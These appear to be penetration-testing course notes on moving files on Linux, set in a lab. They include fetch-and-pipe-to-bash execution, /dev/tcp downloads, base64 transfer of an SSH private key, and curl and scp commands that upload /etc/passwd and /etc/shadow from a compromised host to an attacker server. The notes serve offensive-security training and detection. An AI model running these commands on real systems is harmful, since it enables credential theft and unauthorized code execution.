## Overview

Linux is an extremely versatile operating system and almost always provides **multiple ways to transfer files**, even in restricted environments.

Understanding Linux file transfer techniques helps:

- **Attackers**:
    
    - Maintain persistence
        
    - Deploy malware
        
    - Bypass defensive controls
        
- **Defenders**:
    
    - Detect suspicious behavior
        
    - Harden systems against abuse
        

### Real-World Incident Response Example (Important)

During an IR engagement, multiple web servers were compromised through **SQL Injection**.  
Attackers deployed a **Bash script** that attempted to download malware using **three fallback methods**:

1. `curl`
    
2. `wget`
    
3. `python`
    

✔ All methods used **HTTP**  
✔ Demonstrates attacker **redundancy and adaptability**

📌 **Key takeaway:**  
Although Linux supports FTP, SMB, etc., **most malware uses HTTP/HTTPS** because it is almost always allowed outbound.

---

## Download Operations

**Scenario:**  
We have access to **NIX04** and must download a file from **Pwnbox**.

![Image](https://scaler.com/topics/images/diagram-of-file-transfer-protocol.webp)

![Image](https://opensource.com/sites/default/files/uploads/iptables1.jpg)

---

## Base64 Encoding / Decoding (No Network Required)

### When to Use

- No outbound connectivity
    
- Only terminal access
    
- Small–medium file sizes
    

---

### Pwnbox – Check File Integrity

```bash
md5sum id_rsa
```

```
4e301756a07ded0a2dd6953abf015278  id_rsa
```

---

### Pwnbox – Encode File

```bash
cat id_rsa |base64 -w 0;echo
```

✔ `-w 0` → single line  
✔ `;echo` → clean copy/paste

---

### Linux Target – Decode File

```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K...' | base64 -d > id_rsa
```

---

### Confirm Integrity

```bash
md5sum id_rsa
```

```
4e301756a07ded0a2dd6953abf015278  id_rsa
```

📌 **Important Note ("Keep As Is")**  
You can reverse this process to **upload files** by base64-encoding on the compromised host and decoding on Pwnbox.

---

## Web Downloads with wget and curl

### wget Download

```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

---

### curl Download

```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

📌 **Difference to remember**

- `wget` → `-O`
    
- `curl` → `-o`
    

---

## Fileless Attacks on Linux (Very Important)

Linux pipes allow **execution without writing files to disk**.

⚠ Some payloads (e.g., `mkfifo`) may still create temporary files.

---

### Fileless Execution with curl

```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

---

### Fileless Execution with wget + Python

```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

```
Hello World!
```

✔ Common malware technique  
✔ Reduces disk artifacts

---

## Download with Bash (/dev/tcp)

When **curl, wget, python are unavailable**, Bash can still communicate over TCP.

📌 Requires:

- Bash ≥ 2.04
    
- Compiled with `--enable-net-redirections`
    

---

### Connect to Web Server

```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

---

### Send HTTP Request

```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

---

### Read Response

```bash
cat <&3
```

✔ Extremely stealthy  
✔ Often overlooked by defenders

---

## SSH Downloads (SCP)

SSH is one of the **most reliable** file transfer methods.

---

### Enable SSH Server on Pwnbox

```bash
sudo systemctl enable ssh
sudo systemctl start ssh
```

---

### Verify SSH Is Listening

```bash
netstat -lnpt
```

```
tcp   0   0 0.0.0.0:22   0.0.0.0:*   LISTEN
```

---

### Download File Using SCP

```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

📌 **Best Practice (Keep As Is)**  
Create **temporary users** for file transfers instead of using main credentials.

---

## Upload Operations

Used for:

- Binary exploitation artifacts
    
- Packet captures
    
- Credential exfiltration
    

All download methods can generally be reversed for uploads.

---

## Web Upload (HTTPS)

We use `uploadserver` with HTTPS.

---

### Install uploadserver

```bash
sudo python3 -m pip install --user uploadserver
```

---

### Create Self-Signed Certificate

```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

---

### Start HTTPS Upload Server

```bash
mkdir https && cd https
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

```
File upload available at /upload
```

---

### Upload Files from Compromised Host

```bash
curl -X POST https://192.168.49.128/upload \
-F 'files=@/etc/passwd' \
-F 'files=@/etc/shadow' \
--insecure
```

📌 `--insecure` is required for **self-signed certs**

![Image](https://images.decodo.com/curl_blog_Image_Hero_dfd07d7d5e/curl_blog_Image_Hero_dfd07d7d5e.png)

![[Pasted image 20260210140045.png]]

---

## Alternative Web File Transfer Methods

If the compromised machine:

- Has **Python, PHP, Ruby**, or
    
- Is already a **web server**
    

We can quickly expose files for download.

---

### Python 3 HTTP Server

```bash
python3 -m http.server
```

---

### Python 2.7 HTTP Server

```bash
python2.7 -m SimpleHTTPServer
```

---

### PHP Web Server

```bash
php -S 0.0.0.0:8000
```

---

### Ruby Web Server

```bash
ruby -run -ehttpd . -p8000
```

---

### Download from Pwnbox

```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

📌 **Important Note (Keep As Is)**  
Inbound traffic may be blocked, but here **the attacker initiates the download**, not upload.

---

## SCP Upload

If outbound **TCP/22** is allowed:

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

✔ Secure  
✔ Reliable  
✔ Common in real networks

---

## Key Takeaways (Must Remember)

- Linux almost always provides **multiple file transfer paths**
    
- Attackers chain **fallback methods**
    
- **HTTP/HTTPS dominates malware traffic**
    
- Base64, pipes, `/dev/tcp`, SSH are critical skills
    
- Always verify file integrity (`md5sum`)

### Cheatsheet 

### 🐧 Linux / Cross-Platform Methods

|Command|Purpose|Stealth|Notes|
|---|---|---|---|
|`curl -o file URL`|Download file|⭐⭐⭐☆☆|Common admin behavior|
|`wget URL -O file`|Download file|⭐⭐⭐☆☆|Same as curl; very normal|
|`php -r 'file_get_contents()'`|Download file|⭐⭐☆☆☆|Situational; depends on PHP availability|
|`scp user@host:file local`|Authenticated transfer|⭐⭐☆☆☆|Internal movement only; needs creds|
